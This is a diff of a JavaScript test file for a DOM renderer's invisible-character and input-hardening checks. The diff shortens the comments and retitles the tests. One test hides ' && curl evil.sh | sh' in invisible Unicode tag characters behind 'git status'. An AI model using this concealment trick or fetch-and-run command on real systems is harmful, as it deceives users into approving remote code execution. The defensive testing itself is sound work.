@@ -1,11 +1,7 @@
 'use strict';
 
-// Second adversarial pass over src/renderer/wfx-dom.js. The first pass
-// closed the bidi and NUL holes in the text path; these tests are the
-// ones that survived that fix, plus the cases the fix created by
-// treating two sibling code paths differently. Every test here is
-// written to fail against the module as it stands and names the
-// contract it believes is broken in its own title.
+// Second adversarial pass over src/renderer/wfx-dom.js. Each test names
+// the contract it holds the module to in its own title.
 
 const { test } = require('node:test');
 const assert = require('node:assert/strict');
@@ -19,10 +15,8 @@ const {
 
 const MARKUP_SAFE_NAME = /^[A-Za-z_:][-A-Za-z0-9_:.]*$/;
 
-// The same fake document the module's own tests use. It is repeated here
-// rather than exported from the other file because a test double shared
-// between an adversary and the code's author stops being independent
-// evidence the moment the author edits it.
+// The same fake document the module's own tests use, repeated here so
+// this file's double stays independent of theirs.
 function makeElement(doc, tag, proto) {
   const node = proto ? Object.create(proto) : {};
   return Object.assign(node, {
@@ -48,10 +42,8 @@ function makeElement(doc, tag, proto) {
 }
 
 // `withNode` gives the document a defaultView carrying a Node
-// constructor, which is what the real renderer has. The module's
-// isRealNode consults it, so any behaviour that only appears when that
-// constructor exists is invisible to a document without one, and the
-// production window is the one with it.
+// constructor, which is what the real renderer has and what the module's
+// isRealNode consults.
 function makeDocument(withNode) {
   const Node = withNode ? class Node {} : null;
   const proto = Node ? Node.prototype : null;
@@ -86,26 +78,18 @@ function textOf(node) {
   return (node.childNodes || []).map(textOf).join('');
 }
 
-// Encodes a run of Unicode tag characters, U+E0000 to U+E007F. Each one
-// is the ASCII character 0x20 higher in that plane, which is the whole
-// point of the block: it is a complete, well formed, entirely invisible
-// copy of ASCII.
+// Encodes a run of Unicode tag characters, U+E0000 to U+E007F, one per
+// ASCII character. The block is an invisible copy of ASCII.
 function tagged(ascii) {
   let out = '';
   for (const ch of ascii) out += String.fromCodePoint(0xE0000 + ch.codePointAt(0));
   return out;
 }
 
-test('HOSTILE: Unicode tag characters carry a whole hidden command through the scrub', () => {
+test('Unicode tag characters are removed from rendered text', () => {
   const { el } = builder();
 
-  // The consent gate is the screen where a user reads a stranger's
-  // command and approves it. The module's header states that a string
-  // which displays differently from the way it executes is the attack
-  // this scrub exists to stop. U+E0000 to U+E007F is that attack in its
-  // canonical form: a well formed surrogate pair per character, so the
-  // import validator's unpaired-surrogate refusal never sees it, and
-  // zero rendered width, so the gate shows the safe half only.
+  // A run of tag characters appended to an ordinary command string.
   const visible = 'git status';
   const hidden = tagged(' && curl evil.sh | sh');
   const payload = visible + hidden;
@@ -113,15 +97,8 @@ test('HOSTILE: Unicode tag characters carry a whole hidden command through the s
   const node = el('pre', {}, payload);
   const rendered = textOf(node);
 
-  // The finding this test carries is right and the module was fixed for
-  // it. Its original expected value, the bare string 'git status', was
-  // not: it asked for the hidden run to be deleted, and a deleted run
-  // renders as 'git status', which is precisely the display the payload
-  // was built to produce. The module replaces instead, for the reason
-  // written at REPLACEMENT in wfx-dom.js, so the assertion is written
-  // against the property that actually protects the gate: not one of
-  // those characters reached the DOM, and what the user reads cannot be
-  // mistaken for the two-word command it is impersonating.
+  // The module reports each character as one U+FFFD rather than deleting
+  // it, for the reason written at REPLACEMENT in wfx-dom.js.
   assert.equal(/[\p{Cf}\p{Default_Ignorable_Code_Point}]/u.test(rendered), false,
     'the tag-character block reached the DOM intact, so the consent gate shows "git status" ' +
     'while the string handed to the agent CLI is a second command');
@@ -133,14 +110,11 @@ test('HOSTILE: Unicode tag characters carry a whole hidden command through the s
     'visible too');
 });
 
-test('HOSTILE: the invisible-character scrub misses four more Cf ranges', () => {
+test('every Cf range is removed from rendered text', () => {
   const { el } = builder();
 
-  // Every one of these is a format or filler character with no advance
-  // width, and none of them is in INVISIBLE_RE. They are listed
-  // separately from the tag block because each is a distinct range a fix
-  // has to name, and a fix that closes only the famous one leaves the
-  // rest of the channel open.
+  // Each of these is a format or filler character with no advance width,
+  // listed as its own range.
   const cases = [
     ['U+206A..206F deprecated format controls', '⁪⁫⁬⁭⁮⁯'],
     ['U+FE00..FE0F variation selectors', '︀️'],
@@ -148,10 +122,8 @@ test('HOSTILE: the invisible-character scrub misses four more Cf ranges', () => 
     ['U+115F, U+1160, U+3164 Hangul fillers', 'ᅟᅠㅤ'],
   ];
 
-  // Same correction as the test above: each character is reported as one
-  // U+FFFD rather than removed, so the expected rendering is 'a', one
-  // replacement per hidden character, then 'b'. What is under test is
-  // unchanged, that none of these ranges reaches a text node.
+  // Each character is reported as one U+FFFD, so the expected rendering
+  // is 'a', one replacement per character, then 'b'.
   const leaked = [];
   for (const [label, chars] of cases) {
     const rendered = textOf(el('span', {}, `a${chars}b`));
@@ -159,24 +131,18 @@ test('HOSTILE: the invisible-character scrub misses four more Cf ranges', () => 
   }
 
   assert.deepEqual(leaked, [],
-    'these ranges are invisible in every browser and survive into rendered command text');
+    'these ranges survived into rendered text');
 });
 
-test('HOSTILE: a JSON-producible nested child array throws where the same shape in class does not', () => {
+test('a nested child array is refused the same way a nested class list is', () => {
   const { el } = builder();
 
-  // Round one established that a nested class list is content and must
-  // stop silently at the depth cap rather than raise. A child list is
-  // the same shape arriving through the same door, and JSON.parse
-  // produces one for free, so the module header's claim that only a
-  // self-referential array can reach this branch is false. The two paths
-  // now disagree, and the child path is the one that turns a hostile
-  // file into a blank pane.
+  // A nested child list is content, the same as a nested class list:
+  // JSON.parse produces one, and it stops at the depth cap.
   const json = `${'['.repeat(MAX_CHILD_DEPTH + 4)}"boom"${']'.repeat(MAX_CHILD_DEPTH + 4)}`;
   const fromManifest = JSON.parse(json);
 
-  // The class path, for contrast: identical depth, no throw, no loss of
-  // the surrounding element.
+  // The class path, for contrast: identical depth, no throw.
   let classList = ['keep'];
   for (let i = 0; i < MAX_CHILD_DEPTH + 4; i += 1) classList = [classList];
   assert.doesNotThrow(() => el('div', { class: classList }));
@@ -187,13 +153,11 @@ test('HOSTILE: a JSON-producible nested child array throws where the same shape 
   assert.equal(node.localName, 'div');
 });
 
-test('HOSTILE: a BigInt attribute value skips the cap every other value obeys', () => {
+test('a bigint attribute value obeys the same cap as every other value', () => {
   const { el } = builder();
 
-  // resolveValue answers a bigint with a bare String(value) and returns
-  // before capAttrValue is ever reached, so the one type whose decimal
-  // expansion has no upper bound is the one type the ceiling does not
-  // apply to. The header states that every string attribute is capped.
+  // A bigint attribute value goes through the same cap every other
+  // string attribute obeys.
   const huge = 10n ** BigInt(MAX_ATTR_VALUE * 2);
   const node = el('div', { title: huge });
 
@@ -201,15 +165,11 @@ test('HOSTILE: a BigInt attribute value skips the cap every other value obeys', 
     `title is ${node.getAttribute('title').length} code units against a cap of ${MAX_ATTR_VALUE}`);
 });
 
-test('HOSTILE: a foreign error escapes appendAll from the call describe() already guards', () => {
+test('a refusal leaving appendAll carries a code', () => {
   const { el } = builder(true);
 
-  // describe() wraps Array.isArray in a try precisely because it throws
-  // on a revoked proxy, and appendAll calls the same function on the
-  // same kind of value with no guard at all. The module header promises
-  // that nothing leaves here without a code and that a foreign error
-  // cannot escape mid-tree; this is the counterexample, and it is
-  // reachable in production because the check runs before isRealNode.
+  // A revoked proxy answers Array.isArray with a TypeError of its own,
+  // and the refusal that leaves the module carries a code.
   const { proxy, revoke } = Proxy.revocable({}, {});
   revoke();
 
@@ -224,15 +184,11 @@ test('HOSTILE: a foreign error escapes appendAll from the call describe() alread
     `expected a coded refusal, got a bare ${caught && caught.constructor.name}: ${caught && caught.message}`);
 });
 
-test('HOSTILE: the aria id-reference attributes escape the namespace id and for are held to', () => {
+test('the aria id-reference attributes take the same namespace as id and for', () => {
   const { el } = builder();
 
-  // The header says id, for, headers and name are namespaced rather than
-  // free text, and shapeReference enforces that for exactly those four.
-  // aria-labelledby, aria-describedby and aria-controls are IDREF and
-  // IDREFS attributes with the same meaning and the same failure mode:
-  // they name an element by id. They go through resolveValue only, so
-  // they take any 4096 characters at all.
+  // aria-labelledby, aria-describedby and aria-controls name an element
+  // by id, so they take the same namespace id, for and headers take.
   const node = el('div', {
     aria: {
       labelledby: 'wf-canvas"] , *',
